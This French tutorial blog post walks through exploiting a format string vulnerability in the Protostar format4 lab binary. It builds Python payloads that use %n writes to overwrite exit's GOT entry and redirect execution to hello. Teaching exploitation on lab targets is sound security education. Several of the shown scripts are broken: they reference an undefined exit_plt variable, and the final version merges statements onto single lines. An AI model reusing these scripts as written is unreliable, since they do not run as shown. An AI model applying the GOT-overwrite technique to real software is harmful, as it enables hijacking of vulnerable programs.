---
title: "Format Strings"
date: "2019-10-22"
description: "Les format strings sont une autre forme de vulnérabilité pouvant permettre de rediriger le flow d’exécution d'un programme, voyons ensemble comment les exploiter."
categories:
  - "exploit"
  - "tutos"
image: "/medias/articles/format-strings/Glider_rubik.jpg"
---

### Qu'est ce que c'est ?

En C, de nombreuses fonctions permettent le formatage d'une variable avant l'affichage , comme _%s %i %d_ pour les plus connues. Les fonctions comme _printf, vsprintf,_ ou _fprintf_ utilisent ces formateurs afin de transformer les variables avant l'affichage. Cependant, lorsque aucun formateur n'est imposé, le programme va considérer la variable et appliquer les formateurs présent dans cette dernière.

Si l'utilisateur à le contrôle de cette variable, il se produit une vulnérabilité "Format string".

Les format strings peuvent être utilisées de différentes manières.  
Il est possible de :

- Lire du contenu en mémoire (%x)
- Ecrire du contenu en mémoire ( write-what-where ) (%n)

### Exemple

Pour cet article, nous allons nous baser sur le [challenge 4 de Protostar.](https://exploit-exercises.lains.space/protostar/format4/)

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];
  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  exit(1);
}

int main(int argc, char **argv)
{
  vuln();
}
```

Nous pouvons garder l'ASLR celle ci ne nous handicapera pas.

```
gcc -fno-stack-protector -o vuln source.c -m32
cat /proc/sys/kernel/randomize_va_space 2
```

Ce morceau de code mets simplement en évidence la présence d'une vulnérabilité de type format string "classique". La ligne 20 comporte un _printf_ d'un contenu contrôlé par l'utilisateur sans formatage imposé.

#### Mise en évidence de la vulnérabilité

Commençons par lancer le programme de manière "légitime".

![Comportement "normal"](/medias/articles/format-strings/image-1.png)

Le programme se contente de restituer le contenu de la variable buffer à l'aide du printf. Lançons ensuite le programme avec le formateur _%x_.

![Mise en évidence de la vulnérabilité](/medias/articles/format-strings/image.png)

Nous pouvons constater que le résultat n'est pas le même. Nous mettons en évidence la présence de la vulnérabilité. Tentons à présent de prendre le contrôle sur ce programme. Pour cela, nous devons tout d'abord savoir quel argument nous contrôlons sur la pile, j'utilise donc comme premier argument AAAA suivi d'une bonne dizaine de formateurs.

![Manipulation du programme](/medias/articles/format-strings/image-2.png)

Nous pouvons repérer la présence de _41414141_ en 7ème position sur la pile. Vérifions le simplement :

![](/medias/articles/format-strings/image-3.png)

Le format d'écriture %Y$x permet d'accéder au Yème paramètre de la pile, ce qui est plus simple que d'écrire Y fois "_%x_".

#### Road to EIP

La fonction _vuln_ contient le morceau de code vulnérable, il contient également le moyen de contrôler EIP. En effet, la fonction _exit_ qui suit le _printf_ n'aura à l’exécution pas encore été résolue. Il est alors possible d'écraser la valeur de _exit_ dans la GOT pour une valeur que nous contrôlons (l'objectif ici étant la fonction _hello_ )

Nous allons ici utiliser le formateur _%n_ ce dernier permet "d'écrire à l'emplacement indiqué, le nombre de caractères qui ont été précédemment écrits"

La description des formateurs est indiquée dans le man 3 de la fonction printf, ainsi que cet extrait :

BUGS Because sprintf() and vsprintf() assume an arbitrarily long string, callers must be careful not to overflow the actual space; this is often impossible to assure. Note that the length of the strings produced is locale-dependent and difficult to pre‐ dict. Use snprintf() and vsnprintf() instead (or asprintf(3) and vasprintf(3)).

Code such as printf(foo); often indicates a bug, since foo may contain a % charac‐ ter. If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

Récoltons à présent les informations nécessaires à l'exploitation de la vulnérabilité :

Tout d'abord, l'emplacement de la fonction "Hello", ALSR ou pas, les segment de codes ne sont pas placées de manière aléatoire, nous pouvons donc directement utiliser cette adresse.

![Obtention de l'adresse de la fonction hello](/medias/articles/format-strings/image-4.png)

![Obtention de l'adresse de la fonction exit dans la GOT](/medias/articles/format-strings/image-5.png)

#### Debugging

Pour la suite de l'exploitation je vous conseille d'utiliser deux shells distincts, le premier servira à lancer GDB, le second à éditer et générer le payload.

Posons un breakpoint avant le call du dernier _printf_ de la fonction vuln, puis juste après. De même, nous pouvons proser un watchpoint sur l'adresse de la fonction exit dans la PLT ( 0x804a20 ).

Nous avons à présent les informations nécessaires pour commencer notre script :

```
import struct
hello_func = 0x80484fd
exit_func = 0x804a020

exploit = ""
exploit += struct.pack('I',exit_plt) #arg 7
exploit += "%x"
exploit += "%7$n"

print exploit
```

Lançons ce script et redirigeons la sortie vers un fichier dans /tmp, il sera plus simple d'opérer le debug dans GDB par ce biais.

```
python2 sploit.py &gt; /tmp/a
```

Puis dans gdb, après avoir placé nos breakpoints :

```
gdb-peda$ run < /tmp/a
```

Inspectons la valeur de l'adresse de la fonction exit sur la PLT juste avant l’exécution de la fonction _printf_ vulnérable.

![Valeur "normale de la PLT"](/medias/articles/format-strings/image-7.png)

Continuons le débug juste après l’exécution du morceau de code vulnérable :

![Breakpoint](/medias/articles/format-strings/image-6.png)

Nous constatons que cette valeur est modifiée elle passe de 0x080483e6 à 0x0000000b. Nous avons donc réussi à la manipuler.

#### Ecriture de la bonne valeur

A présent nous devons inscrire 0x80484fd ( adresse de la fonction hello ). Actuellement, nous avons la valeur 0x0b inscrite, c'est à dire qu'a cet instant, le formateur %n à déduis que nous avions écrit 11 caractères. Nous devons a présent en écrire 0x80484fd-0x0b de plus, soit : 134 513 917.

Ecrire plus d'un million de caractères voici un bon moyen de planter notre programme et cela ne va tout simplement pas marcher.

Pour éviter ce problème nous allons ruser, et inscrire cette valeur en deux fois, tout d'abord la partie basse de l'adresse ( 0x84fd ) puis la partie haute (0x0804) ce qui fait un nombre de caractères à inscrire nettement moins important. A présent, recherchons la bonne valeur à l'aide de GDB.

0x84fd correspond à 34045 en int, tentons avec cette valeure.

```
import struct
hello_func = 0x80484fd
exit_func = 0x804a020

exploit = ""
exploit += struct.pack('I',exit_plt) #arg 7
exploit += "%34045x"
exploit += "%7$n"

print exploit
```

![](/medias/articles/format-strings/image-8.png)

Nous obtenons comme valeur 0x00008505, soit 0x00008505-0x84fd =  
8 caractères de trop ! Ceci est due au caractères précédemment "inscrits". Rectifions notre code :

```
import struct
hello_func = 0x80484fd
exit_func = 0x804a020

exploit = ""
exploit += struct.pack('I',exit_plt) #arg 7
exploit += "%34037x"
exploit += "%7$n"

print exploit
```

![](/medias/articles/format-strings/image-9.png)

Super ! il ne reste plus qu'a inscrire la bonne valeur dans la partie haute.

Pour cela, nous allons décaler notre adresse d'écriture à exit@got.plt+2.

![Décalage en mémoire](/medias/articles/format-strings/image-10.png)

Et nous reprenons le même principe.

```
import struct

hello_func = 0x80484fd #func to call to win
exit_plt = 0x804a020

exploit = ""
exploit += struct.pack('I',exit_plt) #7eme arg
exploit += struct.pack('I',exit_plt+2) # 8eme arg

exploit += "%34037x"
exploit += "%7$n "

exploit += "%x"
exploit += "%8$n"

print exploit
```

![Ecriture dans la partie haute de l'adresse](/medias/articles/format-strings/image-11.png)

8506, voici une valeur bien inattendue. C'est pourtant logique, le formateur "_%n_" inscrivant le nombre de caractères précédemment affichés il va dépendre du nombre déja inscrit dans la partie basse.

Mais alors comment inscrire 0x0804 dans la partie haute ? Et bien en inscrivant 0x10804 dans la "partie basse" de exit@plt+2.

0x10804-0x8506+8 = 33542 ( +8 car nous avons ajouté une adresse donc 8 caractères ). Nous obtenons à présent le code suivant :

```
import struct
hello_func = 0x80484fd #func to call to win exit_plt = 0x804a020
exploit = ""
exploit += struct.pack('I',exit_plt) #7eme arg
exploit += struct.pack('I',exit_plt+2) # 8eme arg
exploit += "%34037x" exploit += "%7$n "
exploit += "%33542x" exploit += "%8$n"
print exploit
```

![Les adresses ont bien les bonnes valeurs](/medias/articles/format-strings/image-12.png)

Nous pouvons constater que l'adresse inscrite dans la PLT est bien celle de la fonction hello. La redirection est donc valide :

![](/medias/articles/format-strings/image-13.png)

Nous pouvons jouer cet exploit hors de GDB :

```
shoxx@pwnable:~/Format4$ python2 sploit.py | ./vuln
 "AAAA                                                   [....]
code execution redirected! you win
```

### Conclusion

Nous avons ici exploité une format string afin de modifier une adresse située dans la PLT. Cet exemple est "typique" d'une format string. Je vous invite dans la section [writeup](https://shoxxdj.fr/writeups/) pour découvrir d'autres cas d’exploitation de cette vulnérabilité.
